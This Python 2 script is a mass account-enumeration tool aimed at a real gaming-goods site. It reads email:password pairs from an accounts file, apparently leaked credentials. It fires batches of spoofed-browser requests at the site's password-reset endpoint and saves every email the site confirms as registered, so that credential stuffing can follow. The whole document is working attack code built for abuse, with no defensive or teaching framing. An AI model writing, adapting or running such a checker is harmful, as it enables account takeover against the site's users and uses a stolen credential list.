# -*- coding: utf-8 -*-
import grequests
import re
import Queue
import random
import codecs
from threading import Thread

proxy = '127.0.0.1:8888'
prozy = {
	'http': proxy,
	'https': proxy
}

def exception_handler(request, exception):
	print "Request failed", exception
	
def call(c):
	def hook(r, **kwargs):
		f = open("checked.txt", "a")
		f.write('{0}\n'.format(c))
		f.close()
		if 'Check your email for further instructions.' in r.text:
			print c, 'works!'
			f = open("reg.txt", "a")
			f.write('{0}\n'.format(c))
			f.close()
		else:
			print c, 'does not work!'
	return hook

def check(q):
	while True:
		try:
			headers = {
				'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36',
				'Accept-Encoding': 'gzip',
				'Content-Type': 'application/x-www-form-urlencoded'
			}
			gls = []
			while len(gls) <= 50:
				c = q.get()
				user = c.split(':')[0]
				gls.append(
					grequests.post(
						'http://member.igvault.com/register/request-password-reset',
						data='PasswordResetRequestForm%5Bcus_email%5D={0}'.format(user),
						verify=False,
						headers=headers,
						#proxies=prozy,
						hooks=dict(response=call(c))
					)
				)
			grequests.map(gls)
			q.task_done()
		except Exception, e:
			print e
	
def main():
	with codecs.open('accounts.txt', 'r', encoding='utf-8') as f:
		users = f.readlines()
	with codecs.open('checked.txt', 'r', encoding='utf-8') as f:
		checked = f.read()
		
	queue = Queue.Queue()
	worker = Thread(target=check, args=(queue,))
	worker.start()
	for user in users:
		l = re.findall('^\d+@', user)
		if user not in checked and not l:
			if user.strip().split(':')[0] not in ''.join(list(queue.queue)):
				queue.put(user.strip())
	check(queue)		
if __name__ == '__main__':
	main()